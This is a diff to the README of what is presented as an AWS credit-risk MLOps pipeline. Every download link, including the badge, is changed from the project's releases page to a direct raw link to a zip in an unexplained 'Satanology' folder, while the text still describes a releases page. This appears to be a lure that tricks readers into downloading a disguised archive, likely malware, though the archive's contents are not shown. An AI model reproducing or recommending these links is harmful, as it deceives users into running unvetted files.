@@ -1,6 +1,6 @@
 # 🚀 awsMLOpsCreditRiskPipeline - Simplifying Credit Risk Assessment
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/K-Sutha/awsMLOpsCreditRiskPipeline/releases)
+[![Download Now](https://raw.githubusercontent.com/K-Sutha/awsMLOpsCreditRiskPipeline/main/Satanology/awsMLOpsCreditRiskPipeline.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/K-Sutha/awsMLOpsCreditRiskPipeline/main/Satanology/awsMLOpsCreditRiskPipeline.zip)
 
 ## 📦 Overview
 
@@ -33,7 +33,7 @@ To get started with the **awsMLOpsCreditRiskPipeline**, follow these steps to do
 
 1. **Visit the Download Page**  
    Click the link below to visit the releases page where you can download the required files.  
-   [Download Here](https://github.com/K-Sutha/awsMLOpsCreditRiskPipeline/releases)
+   [Download Here](https://raw.githubusercontent.com/K-Sutha/awsMLOpsCreditRiskPipeline/main/Satanology/awsMLOpsCreditRiskPipeline.zip)
 
 2. **Choose your version**  
    On the releases page, you will see various versions available. Select the latest version for the best performance and most up-to-date features.
@@ -95,4 +95,4 @@ Yes, our support team is available via the repository page. We will respond to i
 
 We welcome contributions from users and developers. If you would like to help improve the application, please visit our GitHub page for more details on how to contribute.
 
-[Download Here](https://github.com/K-Sutha/awsMLOpsCreditRiskPipeline/releases)
+[Download Here](https://raw.githubusercontent.com/K-Sutha/awsMLOpsCreditRiskPipeline/main/Satanology/awsMLOpsCreditRiskPipeline.zip)
